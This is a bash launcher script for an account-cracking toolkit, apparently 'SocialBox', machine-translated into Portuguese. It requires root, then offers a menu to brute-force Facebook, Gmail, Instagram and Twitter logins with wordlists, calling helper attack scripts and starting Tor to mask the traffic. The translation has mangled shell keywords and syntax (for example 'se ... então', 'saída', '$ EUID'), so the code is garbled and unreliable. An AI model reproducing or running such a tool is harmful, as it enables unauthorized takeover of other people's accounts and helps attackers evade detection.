#! / bin / bash
# Cores
branco = " \ 033 [1; 37m "
cinza = " \ 033 [0; 37m "
roxo = " \ 033 [0; 35m "
vermelho = " \ 033 [1; 31m "
verde = " \ 033 [1; 32m "
amarelo = " \ 033 [1; 33m "
Roxo = " \ 033 [0; 35m "
Ciano = " \ 033 [0; 36m "
Café = " \ 033 [0; 33m "
Fiuscha = " \ 033 [0; 35m "
azul = " \ 033 [1; 34m "
nc = " \ e [0m "
# ROOT PRIVILEGIES
se [[ $ EUID  -ne 0]] ;  então
        echo -e " $ red Você não tem privilégios de Root, execute o script como root. $ nc "
        saída 1
fi
# Instalação
dormir 1
echo -e " Verificando a instalação $ nc "
bash install-sb.sh
echo -e " Verificação concluída [ $ green ✓ $ nc ] $ nc  "
dormir 1
Claro
# Startup
echo -e " $ green "
echo  " 		.▄▄ · ▄▄ · ▪ ▄▄▄ · ▄▄▌ ▄▄▄▄ · ▐▄ • "
echo  " 		▐█ ▀. ▪ ▐█ ▌▪██ ▐█ ▀█ ██ • ▐█ ▀█▪▪ █▌█▌▪ "
echo  " 		▄▀▀▀█▄ ▄█▀▄ ██ ▄▄▐█ · ▄█▀▀█ ██▪ ▐█▀▀█▄ ▄█▀▄ · ██ · "
echo  " 		▐█▄▪▐█▐█▌.▐▌▐███▌▐█▌▐█ ▪▐▌▐█▌▐▌ ██▄▪▐█▐█▌.▐▌▪▐█ · █▌ "
echo -e " 		 ▀▀▀▀ ▀█▄▀▪ · ▀▀▀ ▀▀▀ ▀ ▀ .▀▀▀ · ▀▀▀▀ ▀█▄▀▪ • ▀▀ ▀▀ $ nc  $ blue v1 $ nc "
echo -e " 	[+]               $ red Coded By Belahsan Ouerghi $ nc          		   [+] "
echo -e " 	[+] 		  $ red www.facebook.com/ouerghi.belahsan $ nc  		   [+] "
echo -e " 	[+] 		  $ red Greetz para todos os pentesters $ nc           		   [+] "
echo -e " 	[+] $ red Greetz Especial Para $ nc : $ green {thelinuxchoice, Ha3MrX, Tunisian Eagles} $ nc [+] "
echo  " "
echo -e " $ yellow Selecionar no menu: $ nc "
echo  " "
echo -e " 		$ Cyan 1: conta de força bruta do Facebook $ nc "
echo -e " 		$ Cyan 2: conta do Gmail de força bruta $ nc "
echo -e " 		$ Cyan 3: conta do Instagram de força bruta $ nc "
echo -e " 		$ Cyan 4: conta do Twitter de força bruta $ nc "
echo -e " 		$ Cyan 99: Sair $ nc "
leia -p " Escolha>   " ch
se [ $ ch  = 1] ;  então
echo -e "			 Força bruta do Facebook $ Cyan $ nc "
echo -e " $ green "
ler -p " Insira a ID / e-mail / nome de usuário / número do Facebook: " id
leia -p " Insira o caminho da lista de palavras: " lista de palavras
echo -e " $ nc "
cd facebook
perl fb-brute.pl $ id  $ lista de palavras
echo -e "  		[+] $ yellow Brute Force Complete $ nc [ $ green ✓ $ nc ] $ nc [+] "
echo -e " $ red "
leia -p " Desejo Voltar ao Menu Principal [S / n]: " verifique
echo -e " $ nc "
if [ $ check  =  " Y " ] ;  então
cd .. && bash SocialBox.sh
elif [ $ check  =  " y " ] ;  então
cd .. && bash SocialBox.sh
elif [ $ check  =  " Sim " ] ;  então
cd .. && bash SocialBox.sh
elif [ $ check  =  " sim " ] ;  então
cd .. && bash SocialBox.sh
elif [ $ check  =  " SIM " ] ;  então
cd .. && bash SocialBox.sh
outro
saída 1
fi
elif [ $ ch  = 2] ;  então
echo -e " 			$ Cyan Gmail Brute Force $ nc "
cd Gemail-Hack
python gemailhack.py
echo -e "                [+] $ yellow Brute Force Complete $ nc [ $ green ✓ $ nc ] $ nc [+] "
echo -e " $ red "
leia -p " Desejo Voltar ao Menu Principal [S / n]: " check2
echo -e " $ nc "
if [ $ check2  =  " Y " ] ;  então
cd .. && bash SocialBox.sh
elif [ $ check2  =  " y " ] ;  então
cd .. && bash SocialBox.sh
elif [ $ check2  =  " Sim " ] ;  então
cd .. && bash SocialBox.sh
elif [ $ check2  =  " sim " ] ;  então
cd .. && bash SocialBox.sh
elif [ $ check2  =  " SIM " ] ;  então
cd .. && bash SocialBox.sh
outro
saída 1
fi
elif [ $ ch  = 3] ;  então
echo -e " 			$ Cyan Instagram Brute Force $ nc "
cd instainsane /
dormir 0,025
	echo -e " 	[+] $ red Serviço Tor declarado $ nc [+] "
dormir 0,9
serviço para iniciar
./instainsane.sh
echo -e "                [+] $ yellow Brute Force Complete $ nc [ $ green ✓ $ nc ] $ nc [+] "
serviço para parar
echo -e " 		[+] $ red Tor de serviço interrompido $ nc [+] "
echo -e " $ red "
leia -p " Desejo Voltar ao Menu Principal [S / n]: " check3
echo -e " $ nc "
if [ $ check3  =  " Y " ] ;  então
cd .. && bash SocialBox.sh
elif [ $ check3  =  " y " ] ;  então
cd .. && bash SocialBox.sh
elif [ $ check3  =  " Sim " ] ;  então
cd .. && bash SocialBox.sh
elif [ $ check3  =  " sim " ] ;  então
cd .. && bash SocialBox.sh
elif [ $ check3  =  " SIM " ] ;  então
cd .. && bash SocialBox.sh
outro
saída 1
fi
elif [ $ ch  = 4] ;  então
echo -e "			 Força bruta do Twitter $ Cyan $ nc "
cd tweetshell /
dormir 0,025
        echo -e " 	[+] $ red Serviço Tor declarado $ nc [+] "
dormir 0,9
serviço para iniciar
bash tweetshell.sh
echo -e "                [+] $ yellow Brute Force Complete $ nc [ $ green ✓ $ nc ] $ nc [+] "
serviço para parar
echo -e " 		[+] $ red Tor de serviço interrompido $ nc [+] "
echo -e " $ red "
leia -p " Desejo Voltar ao Menu Principal [S / n]: " check4
echo -e " $ nc "
if [ $ check4  =  " Y " ] ;  então
cd .. && bash SocialBox.sh
elif [ $ check4  =  " y " ] ;  então
cd .. && bash SocialBox.sh
elif [ $ check4  =  " Sim " ] ;  então
cd .. && bash SocialBox.sh
elif [ $ check4  =  " sim " ] ;  então
cd .. && bash SocialBox.sh
elif [ $ check4  =  " SIM " ] ;  então
cd .. && bash SocialBox.sh
outro
saída 1
fi
elif [ $ ch  == 99] ;  então
echo -e " Saída do programa $ red ... $ nc "
dormir 0,25
saída 1
outro
echo  " Not Found 404, Exit "
saída 1
fi
